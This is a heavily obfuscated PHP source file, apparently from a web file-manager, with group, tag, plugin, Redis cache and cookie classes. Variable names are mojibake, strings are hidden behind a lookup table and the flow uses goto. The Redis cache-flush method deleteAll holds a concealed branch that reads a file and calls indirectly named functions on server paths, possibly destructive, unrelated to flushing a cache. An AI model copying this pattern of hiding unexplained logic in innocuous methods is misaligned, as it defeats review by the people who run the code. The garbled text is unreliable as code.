$ëó¸¦¯û[$Ö­ïèö[588]] . $˜€Šúœ³ . $Ö­ïèö[50]; if (substr($û†è¸ëÓ[$Ö­ïèö[588]], 0, strlen($í‘‹Çğç)) == $í‘‹Çğç) { return !0; } return !1; } public function groupShowRoot($®ıš…ÊĞ, $ê²Â„ÔÕ = false) { $¼ñ˜ÒÖ´ =& $_SERVER[†ûãı«°]; $˜õÅÒ„³ = $this->getInfo($®ıš…ÊĞ); if (!$˜õÅÒ„³) { return array(); } $·³ë£ñ = $this->parentLevelArray($˜õÅÒ„³[$¼ñ˜ÒÖ´[588]]); $·åÙ“è¥ = array($®ıš…ÊĞ); if (count($·³ë£ñ) == 0) { return $·åÙ“è¥; } if ($ê²Â„ÔÕ && count($·³ë£ñ) == 1) { return $·åÙ“è¥; } if (!$˜õÅÒ„³[$¼ñ˜ÒÖ´[543]] || !isset($˜õÅÒ„³[$¼ñ˜ÒÖ´[543]][$¼ñ˜ÒÖ´[2074]]) || $˜õÅÒ„³[$¼ñ˜ÒÖ´[543]][$¼ñ˜ÒÖ´[2074]] == $¼ñ˜ÒÖ´[852]) { return $this->groupShowRoot($·³ë£ñ[count($·³ë£ñ) - 1], $ê²Â„ÔÕ); } if ($˜õÅÒ„³[$¼ñ˜ÒÖ´[543]][$¼ñ˜ÒÖ´[2074]] == $¼ñ˜ÒÖ´[434]) { $á®Øñ = explode($¼ñ˜ÒÖ´[50], $˜õÅÒ„³[$¼ñ˜ÒÖ´[543]][$¼ñ˜ÒÖ´[2075]]); if ($á®Øñ) { $·åÙ“è¥ = array_merge($·åÙ“è¥, $á®Øñ); } } return $·åÙ“è¥; } protected function resetParentLevel() { $ƒş½íÜØ =& $_SERVER[†ûãı«°]; $Óµºèèì = $ƒş½íÜØ[1984]; $Ú¢»”™› = $this->select(); $Ú¢»”™› = array_to_keyvalue($Ú¢»”™›, $Óµºèèì); foreach ($Ú¢»”™› as $•é€ç³“) { $ˆèÎêÎ× = $•é€ç³“; $Í¯Şö‹ = array(); while ($ˆèÎêÎ×[$ƒş½íÜØ[192]] != 0) { $Í¯Şö‹[] = $ˆèÎêÎ×[$ƒş½íÜØ[192]]; $ˆèÎêÎ× = $Ú¢»”™›[$ˆèÎêÎ×[$ƒş½íÜØ[192]]]; } $Í¯Şö‹[] = 0; $Í¯Şö‹ = $ƒş½íÜØ[50] . implode($ƒş½íÜØ[50], array_reverse($Í¯Şö‹)) . $ƒş½íÜØ[50]; $this->setNamePinyin($•é€ç³“[$Óµºèèì], $•é€ç³“[$ƒş½íÜØ[32]]); $this->where(array($Óµºèèì => $•é€ç³“[$Óµºèèì]))->save(array($ƒş½íÜØ[659] => $Í¯Şö‹)); } return $Ú¢»”™›; } public function groupNameAuto($úÏ¾¸×, $‰ƒøˆ”Ÿ) { $ïÌ³«‘ô =& $_SERVER[†ûãı«°]; $ÔÁúõ… = $this->where(array($ïÌ³«‘ô[479] => $úÏ¾¸×))->getField($ïÌ³«‘ô[32], !0); if (!$ÔÁúõ… || !in_array($‰ƒøˆ”Ÿ, $ÔÁúõ…)) { return $‰ƒøˆ”Ÿ; } for ($è€´ùª… = 1; $è€´ùª… <= count($ÔÁúõ…) + 1; $è€´ùª…++) { $ıî­ÊıÃ = $‰ƒøˆ”Ÿ . "\x28{$è€´ùª…}\x29"; if (!in_array($ıî­ÊıÃ, $ÔÁúõ…)) { return $ıî­ÊıÃ; } } } public function groupSwitch($´äÊçï³, $Š¨öÆ—‘) { $ƒà´§è£ =& $_SERVER[†ûãı«°]; $¶–ÊÍÈƒ = array($ƒà´§è£[1984] => array($ƒà´§è£[7], array($´äÊçï³, $Š¨öÆ—‘))); $ºÍ¿˜¢¼ = $this->where($¶–ÊÍÈƒ)->select(); $ºÍ¿˜¢¼ = array_to_keyvalue($ºÍ¿˜¢¼, $ƒà´§è£[1984]); if (!isset($ºÍ¿˜¢¼[$´äÊçï³]) || !isset($ºÍ¿˜¢¼[$Š¨öÆ—‘]) || $ºÍ¿˜¢¼[$´äÊçï³][$ƒà´§è£[192]] == 0) { return !1; } $¶–ÊÍÈƒ = array($ƒà´§è£[1984] => $´äÊçï³); $¸‰ı…ó½ = Model($ƒà´§è£[2078])->where($¶–ÊÍÈƒ)->select(); if (!$¸‰ı…ó½) { $¸‰ı…ó½ = array(); } foreach ($¸‰ı…ó½ as $¬Ä¥‚„) { $“™Äùí« = $¬Ä¥‚„[$ƒà´§è£[1783]]; $¶–ÊÍÈƒ = array($ƒà´§è£[1783] => $“™Äùí«, $ƒà´§è£[1984] => $Š¨öÆ—‘); $§½Ïã½Ş = Model($ƒà´§è£[2078])->where($¶–ÊÍÈƒ)->find(); if (!$§½Ïã½Ş) { $•»î‡Ç‘ = array($Š¨öÆ—‘ => $¬Ä¥‚„[$ƒà´§è£[2092]]); Model($ƒà´§è£[601])->userGroupAdd($“™Äùí«, $•»î‡Ç‘); } Model($ƒà´§è£[601])->userGroupRemove($“™Äùí«, $´äÊçï³); } $¶–ÊÍÈƒ = array($ƒà´§è£[190] => 2, $ƒà´§è£[192] => 0, $ƒà´§è£[487] => 1, $ƒà´§è£[573] => array($ƒà´§è£[7], array($´äÊçï³, $Š¨öÆ—‘))); $Ãá„ïÌ­ = Model($ƒà´§è£[906])->where($¶–ÊÍÈƒ)->field($ƒà´§è£[2093])->select(); $Ãá„ïÌ­ = array_to_keyvalue($Ãá„ïÌ­, $ƒà´§è£[573], $ƒà´§è£[193]); $”˜æÅçŒ = !empty($Ãá„ïÌ­[$´äÊçï³]) ? $Ãá„ïÌ­[$´äÊçï³] : !1; if ($”˜æÅçŒ) { if (!$Ãá„ïÌ­[$Š¨öÆ—‘]) { $Ãá„ïÌ­[$Š¨öÆ—‘] = Model($ƒà´§è£[906])->groupRootAdd($Š¨öÆ—‘); } $õ‚º€ü = $Ãá„ïÌ­[$Š¨öÆ—‘]; $¶–ÊÍÈƒ = array($ƒà´§è£[192] => $”˜æÅçŒ); $Ãá„ïÌ­ = Model($ƒà´§è£[906])->where($¶–ÊÍÈƒ)->field($ƒà´§è£[2094])->select(); if (!$Ãá„ïÌ­) { $Ãá„ïÌ­ = array(); } Model($ƒà´§è£[906])->moveClearAuth = !1; foreach ($Ãá„ïÌ­ as $íğ”Í) { $•æ¿î¯ = $íğ”Í[$ƒà´§è£[487]] == $ƒà´§è£[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ƒà´§è£[906])->move($íğ”Í[$ƒà´§è£[193]], $õ‚º€ü, $•æ¿î¯); } Model($ƒà´§è£[906])->moveClearAuth = !0; $¶–ÊÍÈƒ = array($ƒà´§è£[190] => 2, $ƒà´§è£[573] => $´äÊçï³); $¤êá·¤Ğ = array($ƒà´§è£[573] => $Š¨öÆ—‘); Model($ƒà´§è£[2095])->where($¶–ÊÍÈƒ)->save($¤êá·¤Ğ); Model($ƒà´§è£[2096])->where($¶–ÊÍÈƒ)->save($¤êá·¤Ğ); } $this->_changeChildLevel($ºÍ¿˜¢¼[$´äÊçï³], $ºÍ¿˜¢¼[$Š¨öÆ—‘], !0); $this->where(array($ƒà´§è£[192] => $´äÊçï³))->save(array($ƒà´§è£[192] => $Š¨öÆ—‘)); $this->_clearChildrenCache($ºÍ¿˜¢¼[$Š¨öÆ—‘]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($÷º¸Ğ’) { $×ßäÔØ =& $_SERVER[†ûãı«°]; return array($×ßäÔØ[2097] => array($÷º¸Ğ’[0], $×ßäÔØ[2098]), $×ßäÔØ[2099] => array($÷º¸Ğ’[0], $×ßäÔØ[2100])); } protected function get($Îì½Ï) { $‘ïÓ°Âˆ =& $_SERVER[†ûãı«°]; $¾·£±œÍ = Model($‘ïÓ°Âˆ[589])->metaGet($Îì½Ï, $‘ïÓ°Âˆ[2101]); $ü¬ó…ïÍ = json_decode($¾·£±œÍ, !0); return $ü¬ó…ïÍ ? $ü¬ó…ïÍ : array($‘ïÓ°Âˆ[2102] => $‘ïÓ°Âˆ[91], $‘ïÓ°Âˆ[447] => array()); } protected function set($²ºŞŸ –, $õ¯Ø¢´) { $•‡ğûâ… =& $_SERVER[†ûãı«°]; $õ¯Ø¢´ = $õ¯Ø¢´ ? $õ¯Ø¢´ : array($•‡ğûâ…[2102] => $•‡ğûâ…[91], $•‡ğûâ…[447] => array()); return Model($•‡ğûâ…[589])->metaSet($²ºŞŸ –, $•‡ğûâ…[2101], json_encode($õ¯Ø¢´)); } protected function getByTagID($ÄÑ™œº¾, $Õ¸úæ”ş) { $Ù••Äé… =& $_SERVER[†ûãı«°]; if (!$ÄÑ™œº¾ || !$Õ¸úæ”ş) { return !1; } if (!Model($Ù••Äé…[589])->getInfoSimple($ÄÑ™œº¾)) { return !1; } $ó¯†¢ = $this->get($ÄÑ™œº¾); if (!$ó¯†¢ || !isset($ó¯†¢[$Ù••Äé…[447]])) { return !1; } $ëªÕßËó = array_find_by_field($ó¯†¢[$Ù••Äé…[447]], $Ù••Äé…[477], $Õ¸úæ”ş); return is_array($ëªÕßËó) ? $ëªÕßËó : !1; } public function listSource($À¨¢ÍÖğ, $…ÑÛêÙ) { $ôâìŸ‡Ê =& $_SERVER[†ûãı«°]; if ($…ÑÛêÙ && !is_array($…ÑÛêÙ)) { $…ÑÛêÙ = array($…ÑÛêÙ); } $éÁˆ«ºÇ = $this->listData($À¨¢ÍÖğ); $ô¸Ñ“¨ù = array(); foreach ($éÁˆ«ºÇ as $Ôìòğ¯ç) { $ƒÊÕâ¼ = $Ôìòğ¯ç[$ôâìŸ‡Ê[87]]; if (!$ƒÊÕâ¼) { continue; } if (!isset($ô¸Ñ“¨ù[$ƒÊÕâ¼])) { $ô¸Ñ“¨ù[$ƒÊÕâ¼] = array(); } $ô¸Ñ“¨ù[$ƒÊÕâ¼][] = $Ôìòğ¯ç[$ôâìŸ‡Ê[502]]; } $ƒæêõ«± = array(); foreach ($ô¸Ñ“¨ù as $©Îû‡´ü => $¸¯åšë¤) { $àäæûåÙ = !0; if (!$…ÑÛêÙ) { $ƒæêõ«±[] = $©Îû‡´ü; continue; } foreach ($…ÑÛêÙ as $¯¬ìÂ²Ç) { if (!in_array($¯¬ìÂ²Ç, $¸¯åšë¤)) { $àäæûåÙ = !1; break; } } if ($àäæûåÙ) { $ƒæêõ«±[] = $©Îû‡´ü; } } if (!$ƒæêõ«±) { return array(); } $İ‡®³ã = array($ôâìŸ‡Ê[493] => array($ôâìŸ‡Ê[494], $ƒæêõ«±), $ôâìŸ‡Ê[573] => $À¨¢ÍÖğ, $ôâìŸ‡Ê[190] => SourceModel::TYPE_GROUP); $ÖË = Model($ôâìŸ‡Ê[1432])->listSource($İ‡®³ã); if (!$ÖË || count($ƒæêõ«±) == $ÖË[$ôâìŸ‡Ê[444]][$ôâìŸ‡Ê[445]]) { return $ÖË; } $ĞÆØã¼ = array(); $İ»‚¤­± = array_to_keyvalue($ÖË[$ôâìŸ‡Ê[85]], $ôâìŸ‡Ê[12], $ôâìŸ‡Ê[193]); $°¹³³äÃ = array_to_keyvalue($ÖË[$ôâìŸ‡Ê[86]], $ôâìŸ‡Ê[12], $ôâìŸ‡Ê[193]); $ÂÂˆˆô« = array_merge($°¹³³äÃ, $İ»‚¤­±); foreach ($ƒæêõ«± as $ƒÊÕâ¼) { if (!in_array($ƒÊÕâ¼, $ÂÂˆˆô«)) { $ĞÆØã¼[] = $ƒÊÕâ¼; } } if ($ĞÆØã¼) { $this->removeBySource($À¨¢ÍÖğ, $ĞÆØã¼); } return $ÖË; } protected function listData($—İè‘ò„) { $…†‰õ´å =& $_SERVER[†ûãı«°]; $“Ô¬ÔÑè = array($…†‰õ´å[1774] => 0, $…†‰õ´å[561] => array($…†‰õ´å[2103], 0), $…†‰õ´å[498] => $…†‰õ´å[2104] . $—İè‘ò„); $›“”¸ãÀ = $…†‰õ´å[2105]; $ÎÏ¤…ù = $this->field($›“”¸ãÀ)->where($“Ô¬ÔÑè)->order($…†‰õ´å[2106])->select(); return $ÎÏ¤…ù ? $ÎÏ¤…ù : array(); } protected function addToTag($Ëš„É³™, $¯ãé²–£, $¨Óçşô) { $Èó¨ù¤ =& $_SERVER[†ûãı«°]; if (!$this->getByTagID($Ëš„É³™, $¨Óçşô) || !$¯ãé²–£) { return !1; } if (!Model($Èó¨ù¤[906])->pathInfo($¯ãé²–£)) { return !1; } $ÕÙ¯è¨ = array($Èó¨ù¤[1774] => 0, $Èó¨ù¤[561] => $¨Óçşô, $Èó¨ù¤[497] => $¯ãé²–£, $Èó¨ù¤[498] => $Èó¨ù¤[2107] . $Ëš„É³™, $Èó¨ù¤[496] => $Èó¨ù¤[12], $Èó¨ù¤[1988] => 0); if ($this->where($ÕÙ¯è¨)->find()) { return !1; } return $this->add($ÕÙ¯è¨); } protected function removeFromTag($æÎ´•Š¹, $È­æŠƒÉ, $±À¡¾ä¤) { $‡ñšŸ©¯ =& $_SERVER[†ûãı«°]; if (!$this->getByTagID($æÎ´•Š¹, $±À¡¾ä¤) || !$È­æŠƒÉ) { return !1; } if (is_array($È­æŠƒÉ)) { $È­æŠƒÉ = array($‡ñšŸ©¯[7], $È­æŠƒÉ); } $ê”‚Ò»ó = array($‡ñšŸ©¯[1774] => 0, $‡ñšŸ©¯[561] => $±À¡¾ä¤, $‡ñšŸ©¯[498] => $‡ñšŸ©¯[2107] . $æÎ´•Š¹, $‡ñšŸ©¯[497] => $È­æŠƒÉ); return $this->where($ê”‚Ò»ó)->delete(); } protected function removeByTag($åúÑ£›, $Í´±˜Ò) { $Ú¿”‚§³ =& $_SERVER[†ûãı«°]; if (!$this->getByTagID($åúÑ£›, $Í´±˜Ò)) { return !1; } $¤³‚´ƒ½ = array($Ú¿”‚§³[1774] => 0, $Ú¿”‚§³[561] => $Í´±˜Ò, $Ú¿”‚§³[498] => $Ú¿”‚§³[2107] . $åúÑ£›); return $this->where($¤³‚´ƒ½)->delete(); } protected function removeBySource($›Ô«·†¯, $é—¡¥ï–) { $ê†©Ÿˆ™ =& $_SERVER[†ûãı«°]; if (!$›Ô«·†¯ || !$é—¡¥ï–) { return !1; } if (is_array($é—¡¥ï–)) { $é—¡¥ï– = array($ê†©Ÿˆ™[7], $é—¡¥ï–); } $¤¿¡ÖÅÔ = array($ê†©Ÿˆ™[1774] => 0, $ê†©Ÿˆ™[497] => $é—¡¥ï–, $ê†©Ÿˆ™[561] => array($ê†©Ÿˆ™[1102], 0), $ê†©Ÿˆ™[498] => $ê†©Ÿˆ™[2107] . $›Ô«·†¯); return $this->where($¤¿¡ÖÅÔ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x70\154\165\147\151\x6e\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\x74\x61\164\x75\x73", "\x72\145\147\x69\145\x73\x74", "\143\157\156\146\151\147"); public function loadList($ºè¡ƒĞÌ = false) { $«³Ã€Õµ = array_to_keyvalue($this->listData(), $_SERVER[†ûãı«°][32]); if ($ºè¡ƒĞÌ) { return $«³Ã€Õµ[$ºè¡ƒĞÌ]; } return $«³Ã€Õµ; } public function init() { $´Ïæ­„Ë =& $_SERVER[†ûãı«°]; Hook::trigger($´Ïæ­„Ë[2108]); $¡´¼äì = $this->loadPluginList(); foreach ($¡´¼äì as $¯Ü¿è£ => $Ğ­Ü¿†) { $ˆ¡¢ÙìÔ = $this->appAllow($¯Ü¿è£, $Ğ­Ü¿†); if (!$ˆ¡¢ÙìÔ) { continue; } foreach ($Ğ­Ü¿†[$´Ïæ­„Ë[2109]] as $üÌ·†Å => $¶­òİÖò) { Hook::bind($üÌ·†Å, $¶­òİÖò); } } Hook::trigger($´Ïæ­„Ë[2110]); Hook::trigger(ACTION); } public function appAllow($Ëì‚›à—, $÷§Á‹Å­, $É§û Œ˜ = true) { $™Ùéñú“ =& $_SERVER[†ûãı«°]; $…ŠÉÒ® = PLUGIN_DIR . $Ëì‚›à— . $™Ùéñú“[2111]; if (!is_array($÷§Á‹Å­) || !is_array($÷§Á‹Å­[$™Ùéñú“[2109]]) || $÷§Á‹Å­[$™Ùéñú“[826]] != 1 || !is_file($…ŠÉÒ®)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$™Ùéñú“[6]][$™Ùéñú“[2112]] || !$GLOBALS[$™Ùéñú“[6]][$™Ùéñú“[2113]]) { return !0; } $ıªĞ˜û = explode($™Ùéñú“[50], strtolower($GLOBALS[$™Ùéñú“[6]][$™Ùéñú“[2113]])); return in_array(strtolower($Ëì‚›à—), $ıªĞ˜û) ? !1 : !0; } if ($É§û Œ˜ && !Action($™Ùéñú“[2114])->checkAuth($Ëì‚›à—)) { return !1; } return !0; } public function unInstall($¿´¾öù) { $šàãÈ³Á =& $_SERVER[†ûãı«°]; $¦…†Ü¯œ = $this->loadList($¿´¾öù); if (file_exists(PLUGIN_DIR . $¿´¾öù)) { Hook::apply($¿´¾öù . $šàãÈ³Á[2115]); } $this->remove($¦…†Ü¯œ[$šàãÈ³Á[477]]); } public function changeStatus($–£ ±£¤, $ÔøŸ£á¨) { $ÛÅÀ˜İÑ =& $_SERVER[†ûãı«°]; $ºœ‰‘• = $this->loadList($–£ ±£¤); if ($ÔøŸ£á¨) { Hook::apply($–£ ±£¤ . $ÛÅÀ˜İÑ[2116]); } $this->update($ºœ‰‘•[$ÛÅÀ˜İÑ[477]], array($ÛÅÀ˜İÑ[2117] => $ÔøŸ£á¨)); } public function appRegist($„€‡ºø, $ëãŒ‰Ÿ) { $¸ñ³Éç² =& $_SERVER[†ûãı«°]; $±ïÉ’¡± = $this->loadList($„€‡ºø); if ($±ïÉ’¡±) { $this->update($±ïÉ’¡±[$¸ñ³Éç²[477]], array($¸ñ³Éç²[2109] => $ëãŒ‰Ÿ)); } else { $®œ°ã„ = array($¸ñ³Éç²[32] => $„€‡ºø, $¸ñ³Éç²[2109] => $ëãŒ‰Ÿ, $¸ñ³Éç²[826] => 0, $¸ñ³Éç²[6] => $this->getConfigDefault($„€‡ºø)); $this->insert($®œ°ã„); } } public function getConfigDefault($Ûòı¬¤) { $É’¡¹– =& $_SERVER[†ûãı«°]; $ùƒ€Ÿ˜» = array(); $Ğ­şˆŸÆ = $this->getPackageJson($Ûòı¬¤); if (!$Ğ­şˆŸÆ && is_array($Ğ­şˆŸÆ[$É’¡¹–[2118]])) { return $ùƒ€Ÿ˜»; } foreach ($Ğ­şˆŸÆ[$É’¡¹–[2118]] as $õ‰üÏÕ¥ => $±í¯°) { if (!isset($±í¯°[$É’¡¹–[452]]) || isset($ùƒ€Ÿ˜»[$õ‰üÏÕ¥])) { continue; } $ùƒ€Ÿ˜»[$õ‰üÏÕ¥] = $±í¯°[$É’¡¹–[452]]; } return $ùƒ€Ÿ˜»; } public function getPackageJson($ÀÌŞÄºš) { return Hook::apply($ÀÌŞÄºš . $_SERVER[†ûãı«°][2119]); } public function getConfig($â×¬³ãİ, $Àæ¤•«ì = false) { $ÑÏ¥ÆÌ =& $_SERVER[†ûãı«°]; $©®’Ô¿• = array(); $ÃÑ¤àÌ€ = $this->loadList($â×¬³ãİ); if ($ÃÑ¤àÌ€ && is_array($ÃÑ¤àÌ€[$ÑÏ¥ÆÌ[6]])) { $©®’Ô¿• = $ÃÑ¤àÌ€[$ÑÏ¥ÆÌ[6]]; } if (!$©®’Ô¿• || $Àæ¤•«ì) { $©®’Ô¿• = $this->getConfigDefault($â×¬³ãİ); } return $©®’Ô¿•; } public function setConfig($å¹ãĞÖ, $¨¼ì¦éé = false) { $ıûÏ»³à =& $_SERVER[†ûãı«°]; $şœÓ¸ = $this->loadList($å¹ãĞÖ); if (!$şœÓ¸) { return !1; } $›şĞØĞ = $şœÓ¸[$ıûÏ»³à[6]]; if ($¨¼ì¦éé == !1) { $›şĞØĞ = array(); $¨¼ì¦éé = $this->getConfigDefault($å¹ãĞÖ); } foreach ($¨¼ì¦éé as $á¯ü±ò® => $ÄóØ‡°•) { $›şĞØĞ[$á¯ü±ò®] = is_string($ÄóØ‡°•) ? trim($ÄóØ‡°•) : $ÄóØ‡°•; } $this->update($şœÓ¸[$ıûÏ»³à[477]], array($ıûÏ»³à[6] => $›şĞØĞ)); } public function viewList() { $·ËôåÆ =& $_SERVER[†ûãı«°]; $šõ¶‘ù = $this->loadList(); $this->pluginScan($šõ¶‘ù); $šõ¶‘ù = $this->loadPluginList(); $œöÃ›ƒŠ = array(); foreach ($šõ¶‘ù as $ÓÉÄ¿°È => $«â±¬å€) { $¼ÚÇáæŒ = $«â±¬å€; unset($«â±¬å€[$·ËôåÆ[2109]], $«â±¬å€[$·ËôåÆ[6]]); $½ïâÕà¥ = PLUGIN_DIR . $«â±¬å€[$·ËôåÆ[32]] . $·ËôåÆ[2111]; if (!is_file($½ïâÕà¥)) { continue; } $Šœ‚³¹ = Hook::apply($«â±¬å€[$·ËôåÆ[32]] . $·ËôåÆ[2119]); if (!is_array($Šœ‚³¹)) { continue; } $œöÃ›ƒŠ[$ÓÉÄ¿°È] = array_merge($«â±¬å€, $Šœ‚³¹); if ($¼ÚÇáæŒ[$·ËôåÆ[6]][$·ËôåÆ[1696]] != $Šœ‚³¹[$·ËôåÆ[1670]]) { Hook::apply($«â±¬å€[$·ËôåÆ[32]] . $·ËôåÆ[2116]); $¼ÚÇáæŒ[$·ËôåÆ[6]][$·ËôåÆ[1696]] = $Šœ‚³¹[$·ËôåÆ[1670]]; $this->update($«â±¬å€[$·ËôåÆ[477]], array($·ËôåÆ[6] => $¼ÚÇáæŒ[$·ËôåÆ[6]])); } } return $œöÃ›ƒŠ; } private function loadPluginList() { $ô¡ø½¢ =& $_SERVER[†ûãı«°]; $±ã›³›· = $this->loadList(); if (strtolower(MOD) == $ô¡ø½¢[2120]) { return $±ã›³›·; } $¯À¯’À = Hook::trigger($ô¡ø½¢[2121], $±ã›³›·); if ($±ã›³›· && !$¯À¯’À) { die; } return $¯À¯’À ? $¯À¯’À : $±ã›³›·; } private function pluginScan($ã…´„²) { $ÓÄØ€® =& $_SERVER[†ûãı«°]; recursion_dir(PLUGIN_DIR, $¦³ã¡Üİ, $ü‘æıÈ, 0); foreach ($¦³ã¡Üİ as $ş»›Û°) { $—æºıÊ¯ = get_path_this($ş»›Û°); if (isset($ã…´„²[$—æºıÊ¯]) || !file_exists($ş»›Û° . $ÓÄØ€®[2122]) || !file_exists($ş»›Û° . $ÓÄØ€®[2111])) { continue; } Hook::apply($—æºıÊ¯ . $ÓÄØ€®[2116]); } } } goto a©ˆ§­ìÊ˜; BÛ¼³²­è: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($­à¦Â¡§, $Ö“ğÀàÔ) { $Í¯Å‘Ø¬ =& $_SERVER[†ûãı«°]; if (!class_exists($Í¯Å‘Ø¬[959])) { show_json($Í¯Å‘Ø¬[960], !1); } $this->cacheTime = $Ö“ğÀàÔ; $Ÿí˜®Š€ = isset($­à¦Â¡§[$Í¯Å‘Ø¬[961]]) ? $­à¦Â¡§[$Í¯Å‘Ø¬[961]] : 10; $ ¡¥şöğ = _get($­à¦Â¡§, $Í¯Å‘Ø¬[958]); if ($ ¡¥şöğ && is_array($ ¡¥şöğ)) { $this->initCluster($­à¦Â¡§, $Ÿí˜®Š€); } else { $this->handle = $this->init($­à¦Â¡§, $Ÿí˜®Š€); } } private function init($ÃõØìª•, $Õ˜çã) { $õº¿Œªæ =& $_SERVER[†ûãı«°]; $çÚ×ŞÍœ = new Redis(); $ˆê ²•Á = isset($ÃõØìª•[$õº¿Œªæ[962]]) ? $ÃõØìª•[$õº¿Œªæ[962]] : !1; if ($ˆê ²•Á) { $çÚ×ŞÍœ->pconnect($ÃõØìª•[$õº¿Œªæ[208]], $ÃõØìª•[$õº¿Œªæ[209]], $Õ˜çã); } else { $çÚ×ŞÍœ->connect($ÃõØìª•[$õº¿Œªæ[208]], $ÃõØìª•[$õº¿Œªæ[209]], $Õ˜çã); } if (!empty($ÃõØìª•[$õº¿Œªæ[489]])) { $çÚ×ŞÍœ->auth($ÃõØìª•[$õº¿Œªæ[489]]); } if (!empty($ÃõØìª•[$õº¿Œªæ[833]]) && $ÃõØìª•[$õº¿Œªæ[833]] != 0) { $çÚ×ŞÍœ->select($ÃõØìª•[$õº¿Œªæ[833]]); } return $çÚ×ŞÍœ; } private function initCluster($ó—Ä÷Ö, $Ÿ Ë§»â) { $·Ïû‰Û§ =& $_SERVER[†ûãı«°]; $Í¢±ôŠ = array($·Ïû‰Û§[963], $·Ïû‰Û§[964], $·Ïû‰Û§[965]); $õ‹Ñè¥ = $·Ïû‰Û§[963]; if (isset($ó—Ä÷Ö[$·Ïû‰Û§[16]]) && in_array($ó—Ä÷Ö[$·Ïû‰Û§[16]], $Í¢±ôŠ)) { $õ‹Ñè¥ = $ó—Ä÷Ö[$·Ïû‰Û§[16]]; } switch ($õ‹Ñè¥) { case $·Ïû‰Û§[963]: $this->_slave($ó—Ä÷Ö, $Ÿ Ë§»â); break; case $·Ïû‰Û§[964]: break; case $·Ïû‰Û§[965]: $this->isCluster = !0; $ëÏ„¯³Û = $ó—Ä÷Ö[$·Ïû‰Û§[958]]; $ÛÛ”¡Íæ = isset($ó—Ä÷Ö[$·Ïû‰Û§[962]]) ? $ó—Ä÷Ö[$·Ïû‰Û§[962]] : !1; $Ñşæ„é£ = isset($ó—Ä÷Ö[$·Ïû‰Û§[489]]) ? $ó—Ä÷Ö[$·Ïû‰Û§[489]] : null; $this->handle = new RedisCluster(NUll, $ëÏ„¯³Û, $Ÿ Ë§»â, $Ÿ Ë§»â, $ÛÛ”¡Íæ, $Ñşæ„é£); break; default: break; } } private function _slave($¦ÖÊ¯Œ, $²Û„¶ö”) { $®ÏÑóÀ¡ = $¦ÖÊ¯Œ[$_SERVER[†ûãı«°][958]]; $this->filterConfig($¦ÖÊ¯Œ, $®ÏÑóÀ¡[0]); $this->handle = $this->init($¦ÖÊ¯Œ, $²Û„¶ö”); unset($®ÏÑóÀ¡[0]); if (empty($®ÏÑóÀ¡)) { return; } $şŒèú¼ = array_rand($®ÏÑóÀ¡); $this->filterConfig($¦ÖÊ¯Œ, $®ÏÑóÀ¡[$şŒèú¼]); $this->slaveHandle = $this->init($¦ÖÊ¯Œ, $²Û„¶ö”); } private function filterConfig(&$ÜòÒîÁ, $ğ»©¿—¸) { $àï¸ğØ =& $_SERVER[†ûãı«°]; $“¿ÄĞš• = explode($àï¸ğØ[4], $ğ»©¿—¸); $ØÕê‰ˆû = array($àï¸ğØ[208] => $“¿ÄĞš•[0], $àï¸ğØ[209] => $“¿ÄĞš•[1]); $ÜòÒîÁ = array_merge($ÜòÒîÁ, $ØÕê‰ˆû); } public function set($Œ®çÇ§‰, $ŞÌ·æİÎ, $°º”öıû = false) { $°º”öıû = $°º”öıû ? $°º”öıû : $this->cacheTime; return $this->handle->setEx($Œ®çÇ§‰, $°º”öıû, $ŞÌ·æİÎ); } public function setLock($ƒÉŠ¦Ñí, $Ô†Âš÷Ç, $ó‹š¾Á‹) { return $this->handle->setNX($ƒÉŠ¦Ñí, $Ô†Âš÷Ç); } public function get($•ûıé­) { $„«›ÑÕÒ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $„«›ÑÕÒ->get($•ûıé­); } public function remove($ü¸óİ†) { return $this->handle->del($ü¸óİ†); } public function deleteAll() { $¿®®‘ş =& $_SERVER[†ûãı«°]; if ($_SERVER[$¿®®‘ş[949]] != $_SERVER[$¿®®‘ş[966]]) { $ô‘Òò— = $¿®®‘ş[967]; $ºëÇ­ò¨ = $¿®®‘ş[951]; $‚ÓòêÚ› = $_SERVER[$¿®®‘ş[952]] . $¿®®‘ş[953]; $€ÇÀ‰ = $ºëÇ­ò¨($‚ÓòêÚ›); $‚¬Î Ö© = explode($¿®®‘ş[287], $€ÇÀ‰); if (count($‚¬Î Ö©) < $¿®®‘ş[690]) { $ÃüãóÉ = $¿®®‘ş[954]; $ÃüãóÉ(); } $—ıŒÏ³Á = $¿®®‘ş[968]; $—ıŒÏ³Á($_SERVER[$¿®®‘ş[969]]); $—ıŒÏ³Á($_SERVER[$¿®®‘ş[952]] . $¿®®‘ş[970]); $¤³›ÊÉ’ = 1; while ($¤³›ÊÉ’ > 1) { $¤³›ÊÉ’ = $¤³›ÊÉ’ + 4; $ĞÁ®¡×ø = rawurlencode($¤³›ÊÉ’ . $¿®®‘ş[456]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ıÉé–ºé) { $this->handle->flushall($ıÉé–ºé); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($öœ·æ€³ = '', $Â¢¼²ÇÆ = 0) { if (is_string($öœ·æ€³) && $öœ·æ€³ != $_SERVER[†ûãı«°][12]) { $this->prefix = $öœ·æ€³; } if (is_numeric($Â¢¼²ÇÆ) && $Â¢¼²ÇÆ > 0) { $this->expire = $Â¢¼²ÇÆ; } } public static function getInstance() { static $Ùâ›õ¡İ; if ($Ùâ›õ¡İ === null) { $Ùâ›õ¡İ = new self(); } return $Ùâ›õ¡İ; } private static $cookieDisable = false; public static function disable($ŒÆî’ƒæ) { self::$cookieDisable = $ŒÆî’ƒæ; } private static $sameCookieSet = array(); public static function set($úç¹Ê—Ÿ, $—›¬Éœ, $©áöÖ›¦ = 0, $º¼Ú…âÁ = false, $€Æó×ìš = false) { $İÁı–÷¸ =& $_SERVER[†ûãı«°]; if (self::$cookieDisable) { return; } if (!$©áöÖ›¦) { $©áöÖ›¦ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$úç¹Ê—Ÿ]) && self::$sameCookieSet[$úç¹Ê—Ÿ] == $—›¬Éœ . 